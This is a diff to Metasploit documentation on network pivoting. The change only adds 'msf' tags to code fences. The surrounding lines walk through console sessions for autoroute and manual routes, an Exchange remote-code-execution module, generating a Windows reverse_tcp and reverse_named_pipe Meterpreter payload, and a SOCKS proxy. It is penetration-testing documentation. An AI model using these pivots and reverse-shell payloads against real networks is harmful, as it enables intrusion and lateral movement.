@@ -33,7 +33,7 @@ There a few ways to register this route in Metasploit so that it knows how to re
 ## AutoRoute
 One of the easiest ways to do this is to use the `post/multi/manage/autoroute` module which will help us automatically add in routes for the target to Metasploit's routing table so that Metasploit knows how to route traffic through the session that we have on the Windows 11 box and to the target Windows Server 2019 box. Lets look at a sample run of this command:
 
-```
+```msf
 meterpreter > background
 [*] Backgrounding session 1...
 msf6 exploit(multi/handler) > use post/multi/manage/autoroute
@@ -80,7 +80,7 @@ msf6 post(multi/manage/autoroute) >
 ```
 If we now use Meterpreter's `route` command we can see that we have two route table entries within Metasploit's routing table, that are tied to Session 1, aka the session on the Windows 11 machine. This means anytime we want to contact a machine within one of the networks specified, we will go through Session 1 and use that to connect to the targets.
 
-```
+```msf
 msf6 post(multi/manage/autoroute) > route
 
 IPv4 Active Routing Table
@@ -97,7 +97,7 @@ msf6 post(multi/manage/autoroute) >
 
 All right so that's one way, but what if we wanted to do this manually? First off to flush all routes from the routing table, we will do `route flush` followed by `route` to double check we have successfully removed the entires.
 
-```
+```msf
 msf6 post(multi/manage/autoroute) > route flush
 msf6 post(multi/manage/autoroute) > route
 [*] There are currently no routes defined.
@@ -108,7 +108,7 @@ Now lets trying doing the same thing manually.
 ## Route
 Here we can use `route add <IP ADDRESS OF SUBNET> <NETMASK> <GATEWAY>` to add the routes from within Metasploit, followed by `route print` to then print all the routes that Metasploit knows about. Note that the Gateway parameter is either an IP address to use as the gateway or as is more commonly the case, the session ID of an existing session to use to pivot the traffic through.
 
-```
+```msf
 msf6 post(multi/manage/autoroute) > route add 169.254.0.0 255.255.0.0 1
 [*] Route added
 msf6 post(multi/manage/autoroute) > route add 172.19.176.0 255.255.240 1
@@ -131,7 +131,7 @@ msf6 post(multi/manage/autoroute) >
 
 Finally we can check that the route will use session 1 by using `route get 169.254.204.110`
 
-```
+```msf
 msf6 post(multi/manage/autoroute) > route get 169.254.204.110
 169.254.204.110 routes through: Session 1
 msf6 post(multi/manage/autoroute) >
@@ -141,7 +141,7 @@ If we want to then remove a specific route (such as in this case we want to remo
 
 Example:
 
-```
+```msf
 msf6 post(multi/manage/autoroute) > route remove 172.19.176.0/20 1
 [*] Route removed
 msf6 post(multi/manage/autoroute) > route
@@ -160,7 +160,7 @@ msf6 post(multi/manage/autoroute) >
 ## Using the Pivot
 At this point we can now use the pivot with any Metasploit modules as shown below:
 
-```
+```msf
 msf6 exploit(windows/http/exchange_chainedserializationbinder_denylist_typo_rce) > show options
 
 Module options (exploit/windows/http/exchange_chainedserializationbinder_denylist_typo_rce):
@@ -221,7 +221,7 @@ The Windows Meterpreter payload supports lateral movement in a network through S
 
 First open a Windows Meterpreter session to the pivot machine:
 
-```
+```msf
 msf6 > use payload/windows/x64/meterpreter/reverse_tcp
 smsf6 payload(windows/x64/meterpreter/reverse_tcp) > set lhost 172.19.182.171
 lhost => 172.19.182.171
@@ -237,7 +237,7 @@ msf6 payload(windows/x64/meterpreter/reverse_tcp) > [*] Sending stage (200774 by
 
 Create named pipe pivot listener on the pivot machine, setting `-l` to the pivot's bind address:
 
-```
+```msf
 msf6 payload(windows/x64/meterpreter/reverse_tcp) > sessions -i -1
 [*] Starting interaction with 1...
 
@@ -249,7 +249,7 @@ meterpreter > background
 
 Now generate a separate payload that will connect back through the pivot machine. This payload will be executed on the final target machine.  Note there is no need to start a handler for the named pipe payload.
 
-```
+```msf
 msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > show options
 
 Module options (payload/windows/x64/meterpreter/reverse_named_pipe):
@@ -267,7 +267,7 @@ msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > generate -f exe -o re
 ```
 
 After running the payload on the final target machine a new session will open, via the Windows 11 169.254.16.221 pivot.
-```
+```msf
 msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > [*] Meterpreter session 2 opened (Pivot via [172.19.182.171:4578 -> 169.254.16.221:49674]) at 2022-06-09 13:34:32 -0500
 
 msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > sessions
@@ -383,7 +383,7 @@ Once routes are established, Metasploit modules can access the IP range specifie
 ### Socks Server Module Setup
 Metasploit can launch a SOCKS proxy server using the module: `auxiliary/server/socks_proxy`. When set up to bind to a local loopback adapter, applications can be directed to use the proxy to route TCP/IP traffic through Metasploit's routing tables. Here is an example of how this module might be used:
 
-```
+```msf
 msf6 > use auxiliary/server/socks_proxy
 msf6 auxiliary(server/socks_proxy) > show options
 
